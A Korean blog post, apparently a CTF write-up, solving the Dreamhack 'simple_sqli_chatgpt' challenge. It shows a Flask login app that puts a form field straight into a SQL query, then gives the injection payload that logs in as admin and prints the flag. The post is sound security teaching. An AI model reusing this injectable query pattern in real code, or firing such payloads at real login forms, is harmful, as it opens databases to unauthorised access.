---
title: (5) Dreamhack simple_sqli_chatgpt 문제 풀이
date: 2024-01-10 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
어딘가 이상한 로그인 서비스입니다.  
SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.  
chatGPT와 함께 풀어보세요!

## 문제 풀이
사이트에 접속하면 아래와 같은 로그인 페이지가 구현되어 있습니다.
![](http://kyuyeop.github.io/assets/img/post/5/1.png)
코드는 다음과 같습니다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100), userlevel integer);')
    db.execute(f'insert into users(userid, userpassword, userlevel) values ("guest", "guest", 0), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0);')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userlevel = request.form.get('userlevel')
        res = query_db(f"select * from users where userlevel='{userlevel}'")
        if res:
            userid = res[0]
            userlevel = res[2]
            print(userid, userlevel)
            if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```
코드를 보면 userid가 admin, userlevel이 0이면 flag를 출력하도록 되어 있습니다.  

그리고 19번째 줄에서 db에 users 정보를 추가하는데, ("guest", "guest", 0)인 유저와 ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0)인 유저가 추가되고 있습니다.  
  
admin에 대해 알 수 있는건 userid=admin, userlevel=0 뿐입니다.  
  
그리고 52번째 줄을 보면 사용자 입력을 그냥 쿼리에 때려넣습니다. 즉, sqli 취약점이 존재한다는 거죠.  
  
그럼 주어진 조건에 맞는 쿼리를 완성시키기만 하면 됩니다.
```sql
select * from users where userlevel='{userlevel}'
```
이 쿼리가 서버에서 처리될 텐데, 여기에 어드민에 대한 정보를 슬쩍 끼우는 겁니다.
```sql
select * from users where userlevel='0' and userid='admin'
```
userlevel 부분에 0' and userid='admin가 들어가는 거죠. 실제로 이 페이로드를 입력해서 보내면
![](http://kyuyeop.github.io/assets/img/post/5/2.png)
![](http://kyuyeop.github.io/assets/img/post/5/3.png)
이렇게 flag가 출력됩니다.  
  
sqli는 정답이 저거 하나만은 아닙니다.
![](http://kyuyeop.github.io/assets/img/post/5/4.png)
admin이기만 하면 되므로 or을 쓰거나
![](http://kyuyeop.github.io/assets/img/post/5/5.png)
'을 적고 주석을 쓰는 방법도 있습니다.  

이거 말고도 다양한 풀이가 있을겁니다. union을 이용한 방법이라든지... 그런건 추가로 공부해보세요.

근데 chargpt는 어떻게 쓰라는건지...
{% endraw %}